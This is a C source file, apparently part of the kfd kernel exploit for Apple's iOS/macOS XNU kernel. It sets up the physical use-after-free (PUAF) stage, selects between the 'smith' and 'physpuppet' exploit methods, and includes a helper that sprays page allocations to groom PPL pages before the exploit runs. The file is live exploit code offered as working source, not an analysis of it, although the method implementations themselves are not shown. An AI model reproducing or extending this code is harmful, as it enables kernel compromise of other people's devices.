/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#include "puaf.h"

void puaf_init(struct kfd* kfd, uint64_t exploit_type)
{
    kfd->puaf.number_of_puaf_pages = 2048;
    kfd->puaf.puaf_pages_uaddr = (uint64_t*)(malloc_bzero(kfd->puaf.number_of_puaf_pages * sizeof(uint64_t)));

    if(exploit_type == MEOW_EXPLOIT_SMITH)
    {
        const char* method_name = "smith";
        print_string(method_name);
        kfd->puaf.puaf_method_ops.init = smith_init;
        kfd->puaf.puaf_method_ops.run = smith_run;
        kfd->puaf.puaf_method_ops.cleanup = smith_cleanup;
        kfd->puaf.puaf_method_ops.free = smith_free;
    }
    else
    {
        const char* method_name = "physpuppet";
        print_string(method_name);
        kfd->puaf.puaf_method_ops.init = physpuppet_init;
        kfd->puaf.puaf_method_ops.run = physpuppet_run;
        kfd->puaf.puaf_method_ops.cleanup = physpuppet_cleanup;
        kfd->puaf.puaf_method_ops.free = physpuppet_free;
    }

    kfd->puaf.puaf_method_ops.init(kfd);
}

void puaf_run(struct kfd* kfd)
{
    puaf_helper_give_ppl_pages();
    
    kfd->puaf.puaf_method_ops.run(kfd);
}

void puaf_cleanup(struct kfd* kfd)
{
    kfd->puaf.puaf_method_ops.cleanup(kfd);
}

void puaf_free(struct kfd* kfd)
{
    kfd->puaf.puaf_method_ops.free(kfd);

    bzero_free(kfd->puaf.puaf_pages_uaddr, kfd->puaf.number_of_puaf_pages * sizeof(uint64_t));

    if (kfd->puaf.puaf_method_data) {
        bzero_free(kfd->puaf.puaf_method_data, kfd->puaf.puaf_method_data_size);
    }
}

/*
 * Helper puaf functions.
 */

void puaf_helper_get_vm_map_first_and_last(uint64_t* first_out, uint64_t* last_out)
{
    uint64_t first_address = 0;
    uint64_t last_address = 0;

    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;

    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if (kret == KERN_INVALID_ADDRESS) {
            last_address = address;
            break;
        }

        kfd_assert(kret == KERN_SUCCESS);

        if (!first_address) {
            first_address = address;
        }

        address += size;
        size = 0;
    }

    *first_out = first_address;
    *last_out = last_address;
}

void puaf_helper_get_vm_map_min_and_max(uint64_t* min_out, uint64_t* max_out)
{
    task_vm_info_data_t data = {};
    task_info_t info = (task_info_t)(&data);
    mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
    assert_mach(task_info(mach_task_self(), TASK_VM_INFO, info, &count));

    *min_out = data.min_address;
    *max_out = data.max_address;
}

void puaf_helper_give_ppl_pages(void)
{
    const uint64_t given_ppl_pages_max = 10000;
    const uint64_t l2_block_size = (1ull << 25);

    vm_address_t addresses[given_ppl_pages_max] = {};
    vm_address_t address = 0;
    uint64_t given_ppl_pages = 0;

    uint64_t min_address, max_address;
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);

    while (true) {
        address += l2_block_size;
        if (address < min_address) {
            continue;
        }

        if (address >= max_address) {
            break;
        }

        kern_return_t kret = vm_allocate(mach_task_self(), &address, pages(1), VM_FLAGS_FIXED);
        if (kret == KERN_SUCCESS) {
            memset((void*)(address), 'A', 1);
            addresses[given_ppl_pages] = address;
            if (++given_ppl_pages == given_ppl_pages_max) {
                break;
            }
        }
    }

    for (uint64_t i = 0; i < given_ppl_pages; i++) {
        assert_mach(vm_deallocate(mach_task_self(), addresses[i], pages(1)));
    }

    print_u64(given_ppl_pages);
}

